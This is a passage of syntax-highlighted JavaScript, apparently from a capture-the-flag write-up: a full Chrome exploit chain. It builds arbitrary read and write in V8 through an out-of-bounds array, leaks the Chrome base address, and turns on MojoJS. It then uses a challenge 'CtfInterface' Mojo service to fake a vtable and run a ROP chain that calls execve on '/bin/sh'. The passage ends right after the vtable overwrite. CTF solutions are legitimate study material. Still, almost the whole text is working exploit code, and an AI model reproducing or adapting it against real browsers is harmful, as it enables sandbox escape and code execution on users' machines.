<span class="token keyword">function</span> <span class="token function">make_objs</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint32Array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint32Array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> oob_arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">,</span> <span class="token number">1.2</span><span class="token punctuation">,</span> <span class="token number">1.3</span><span class="token punctuation">,</span> <span class="token number">1.4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> obj_faker <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> float_arr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Float64Array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    a<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">444444</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    b<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token punctuation">[</span>oob_arr<span class="token punctuation">,</span> obj_faker<span class="token punctuation">,</span> float_arr<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">function</span> <span class="token function">enable_mojo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> <span class="token punctuation">[</span>oob_arr<span class="token punctuation">,</span> obj_faker<span class="token punctuation">,</span> float_arr<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">make_objs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'oob_arr.length = '</span> <span class="token operator">+</span> oob_arr<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">let</span> old_28 <span class="token operator">=</span> oob_arr<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// external_pointer</span>
    <span class="token keyword">let</span> old_29 <span class="token operator">=</span> oob_arr<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// base_pointer</span>
    <span class="token keyword">let</span> r13 <span class="token operator">=</span> old_28<span class="token punctuation">.</span><span class="token function">f2i</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffff00000000n</span>

    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'old_28 = '</span> <span class="token operator">+</span> old_28<span class="token punctuation">.</span><span class="token function">f2i</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'old_29 = '</span> <span class="token operator">+</span> old_29<span class="token punctuation">.</span><span class="token function">f2i</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    
    <span class="token keyword">function</span> <span class="token function">addrOf</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        obj_faker<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> obj<span class="token punctuation">;</span>
        <span class="token keyword">return</span> oob_arr<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">f2i</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffn</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function">arb_read</span><span class="token punctuation">(</span><span class="token parameter">addr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        oob_arr<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>addr <span class="token operator">&amp;</span> <span class="token number">0xffffffff00000000n</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">7n</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">i2f</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        oob_arr<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>addr <span class="token operator">-</span> <span class="token number">8n</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">1n</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffffn</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">i2f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">return</span> float_arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">f2i</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
    <span class="token keyword">function</span> <span class="token function">arb_write</span><span class="token punctuation">(</span><span class="token parameter">addr<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        oob_arr<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>addr <span class="token operator">&amp;</span> <span class="token number">0xffffffff00000000n</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">7n</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">i2f</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        oob_arr<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>addr <span class="token operator">-</span> <span class="token number">8n</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">1n</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffffn</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">i2f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        float_arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">i2f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">let</span> div <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> div_addr <span class="token operator">=</span> <span class="token function">addrOf</span><span class="token punctuation">(</span>div<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'div_addr = '</span> <span class="token operator">+</span> div_addr<span class="token punctuation">.</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">let</span> chrome_base <span class="token operator">=</span> <span class="token function">arb_read</span><span class="token punctuation">(</span>r13 <span class="token operator">|</span> <span class="token punctuation">(</span>div_addr <span class="token operator">+</span> <span class="token number">0xCn</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x000000000c1bb7c0n</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'chrome_base = '</span> <span class="token operator">+</span> chrome_base<span class="token punctuation">.</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">let</span> is_mojo_js_enabled <span class="token operator">=</span> chrome_base <span class="token operator">+</span> <span class="token number">0x000000000c560f0en</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> is_mojo_js_test_enabled <span class="token operator">=</span> chrome_base <span class="token operator">+</span> <span class="token number">0x000000000c560f0fn</span><span class="token punctuation">;</span>


    <span class="token comment">// enable mojo</span>
    <span class="token function">arb_write</span><span class="token punctuation">(</span>is_mojo_js_enabled<span class="token punctuation">,</span> <span class="token number">1n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">arb_write</span><span class="token punctuation">(</span>is_mojo_js_test_enabled<span class="token punctuation">,</span> <span class="token number">1n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'mojo enable!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    window<span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">reload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">sandbox_escape</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">ctfRead</span><span class="token punctuation">(</span><span class="token parameter">ctf<span class="token punctuation">,</span> offset</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> f_b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Float64Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> i_b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigUint64Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">let</span> float_val <span class="token operator">=</span>  <span class="token keyword">await</span> ctf<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">r</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> r<span class="token punctuation">.</span>value<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
        f_b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> float_val<span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token function">BigInt</span><span class="token punctuation">(</span>i_b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span><span class="token parameter">ctf<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> f_b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Float64Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> i_b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigUint64Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>

        i_b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token keyword">await</span> ctf<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>f_b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> offset<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">r</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> r<span class="token punctuation">.</span>value<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">ctfResize</span><span class="token punctuation">(</span><span class="token parameter">ctf<span class="token punctuation">,</span> size</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token keyword">await</span> ctf<span class="token punctuation">.</span><span class="token function">resizeVector</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">r</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> r<span class="token punctuation">.</span>value<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function">ctfCreate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> ctf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">blink<span class="token punctuation">.</span>mojom<span class="token punctuation">.</span>CtfInterfacePtr</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> req <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mojo<span class="token punctuation">.</span>makeRequest</span><span class="token punctuation">(</span>ctf<span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        Mojo<span class="token punctuation">.</span><span class="token function">bindInterface</span><span class="token punctuation">(</span>blink<span class="token punctuation">.</span>mojom<span class="token punctuation">.</span>CtfInterface<span class="token punctuation">.</span>name<span class="token punctuation">,</span> req<span class="token punctuation">.</span>handle<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">return</span> ctf<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>


    <span class="token keyword">let</span> vec_base <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> vec_end <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> size <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> rop_len <span class="token operator">=</span> <span class="token number">0x10</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> vtable <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> vtable_offset <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> ctf<span class="token punctuation">,</span> arb<span class="token punctuation">;</span>

    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'finding vector address...'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>vtable_offset <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        ctf <span class="token operator">=</span> <span class="token function">ctfCreate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        arb <span class="token operator">=</span> <span class="token function">ctfCreate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">await</span> <span class="token function">ctfResize</span><span class="token punctuation">(</span>ctf<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">await</span> <span class="token function">ctfResize</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> rop_len<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>ctf<span class="token punctuation">,</span> i<span class="token punctuation">,</span> <span class="token number">0xfebabedeadbeefn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> rop_len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> i<span class="token punctuation">,</span> <span class="token number">0xfebabedeadbeefn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x1000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">let</span> val <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">ctfRead</span><span class="token punctuation">(</span>ctf<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>val <span class="token operator">&amp;</span> <span class="token number">0xfffn</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x4e0n</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//(vtable &amp; 0xfff) == 0x4e0</span>
                <span class="token keyword">let</span> base <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">ctfRead</span><span class="token punctuation">(</span>ctf<span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">let</span> end <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">ctfRead</span><span class="token punctuation">(</span>ctf<span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                
                <span class="token keyword">if</span> <span class="token punctuation">(</span>end <span class="token operator">></span> base <span class="token operator">&amp;&amp;</span> <span class="token function">Number</span><span class="token punctuation">(</span>end <span class="token operator">-</span> base<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">8</span> <span class="token operator">*</span> rop_len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// found!</span>
                    vtable <span class="token operator">=</span> <span class="token function">BigInt</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    vec_base <span class="token operator">=</span> <span class="token function">BigInt</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    vec_end <span class="token operator">=</span> <span class="token function">BigInt</span><span class="token punctuation">(</span>end<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    vtable_offset <span class="token operator">=</span> i<span class="token punctuation">;</span>

                    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>vtable_offset<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">: vtable = 0x</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>vtable<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">, vec_base = 0x</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>vec_base<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">, vec_end = 0x</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>vec_end<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">break</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>

            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span> <span class="token comment">// for (let i = 4; i &lt; 0x1000; i++)</span>
    <span class="token punctuation">&#125;</span> <span class="token comment">// while (vec_base == 0)</span>

    <span class="token comment">// async function arb_read(addr) &#123;    </span>
    <span class="token comment">//     await ctfWrite(ctf, vtable_offset+1, addr);</span>
    <span class="token comment">//     await ctfWrite(ctf, vtable_offset+2, addr+8n);</span>

    <span class="token comment">//     let val = await ctfRead(arb, 0);</span>

    <span class="token comment">//     await ctfWrite(ctf, vtable_offset+1, vec_base);</span>
    <span class="token comment">//     await ctfWrite(ctf, vtable_offset+2, vec_end);</span>

    <span class="token comment">//     return val;</span>
    <span class="token comment">// &#125;</span>

    <span class="token comment">// async function arb_write(addr, val) &#123;    </span>
    <span class="token comment">//     await ctfWrite(ctf, vtable_offset+1, addr);</span>
    <span class="token comment">//     await ctfWrite(ctf, vtable_offset+2, addr+8n);</span>

    <span class="token comment">//     let val = await ctfWrite(arb, 0, val);</span>

    <span class="token comment">//     await ctfWrite(ctf, vtable_offset+1, vec_base);</span>
    <span class="token comment">//     await ctfWrite(ctf, vtable_offset+2, vec_end);</span>

    <span class="token comment">//     return val;</span>
    <span class="token comment">// &#125;</span>
    
    <span class="token keyword">let</span> chrome_base <span class="token operator">=</span> vtable <span class="token operator">-</span> <span class="token number">0xbc774e0n</span><span class="token punctuation">;</span>
    <span class="token comment">// let execve_got = chrome_base + 0x0000c2cf5f8n;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">chrome_base = </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>chrome_base<span class="token punctuation">.</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// let execve = await arb_read(execve_got);</span>
    <span class="token keyword">let</span> execve_plt <span class="token operator">=</span> chrome_base <span class="token operator">+</span> <span class="token number">0xbb89d50n</span><span class="token punctuation">;</span>


    <span class="token comment">// let __libc_start_main_got = chrome_base + 0xC29C0C0n;</span>
    <span class="token comment">// await ctfWrite(ctf, vtable_offset+1, __libc_start_main_got);</span>
    <span class="token comment">// await ctfWrite(ctf, vtable_offset+2, __libc_start_main_got+8n);</span>

    <span class="token comment">// let __libc_start_main = await ctfRead(arb, 0);</span>
    <span class="token comment">// console.log(`printf = $&#123;__libc_start_main.hex()&#125;`);</span>
    
    <span class="token comment">// let lbase = __libc_start_main - 0x26fc0n;</span>
    <span class="token comment">// let system = lbase + 0x55410n</span>


    <span class="token comment">// // restore</span>
    <span class="token comment">// await ctfWrite(ctf, vtable_offset+1, vec_base);</span>
    <span class="token comment">// await ctfWrite(ctf, vtable_offset+2, vec_end);</span>


    
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'write rop ...'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token keyword">let</span> fake_vtable <span class="token operator">=</span> vec_base<span class="token punctuation">;</span>
    <span class="token keyword">let</span> rop_base <span class="token operator">=</span> vec_base<span class="token punctuation">;</span>

    <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> chrome_base <span class="token operator">+</span> <span class="token number">0x3d994e1n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// add rsp, 0x20; pop rbp; ret;</span>
    <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> chrome_base <span class="token operator">+</span> <span class="token number">0x590510en</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// xchg rax, rsp; ret; -> ResizeVector (rax = vtable)</span>
    
    <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> chrome_base <span class="token operator">+</span> <span class="token number">0x37bb280n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// pop rdi</span>
    <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> rop_base<span class="token operator">+</span><span class="token number">14n</span><span class="token operator">*</span><span class="token number">8n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// addrOf"/bin/sh"</span>
    
    <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> chrome_base <span class="token operator">+</span> <span class="token number">0x099b8ee0n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// pop rsi</span>
    <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> rop_base <span class="token operator">+</span> <span class="token number">13n</span> <span class="token operator">*</span> <span class="token number">8n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// args</span>
    
    <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> chrome_base <span class="token operator">+</span> <span class="token number">0x3655332n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// pop rdx</span>
    <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> rop_base <span class="token operator">+</span> <span class="token number">13n</span> <span class="token operator">*</span> <span class="token number">8n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// env</span>

    <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> execve_plt<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// env</span>
    <span class="token comment">// await ctfWrite(arb, 13, rop_base + 14n * 8n);       // addrOf"/bin/sh"</span>
    <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">0n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment">// NULL</span>
    <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">0x68732f6e69622fn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// "/bin/sh"</span>
    <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">0n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment">// NULL</span>

    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'change vtable ...'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>ctf<span class="token punctuation">,</span> vtable_offset<span class="token punctuation">,</span> fake_vtable<span class="token punctuation">)</span><span class="token punctuation">;</span>

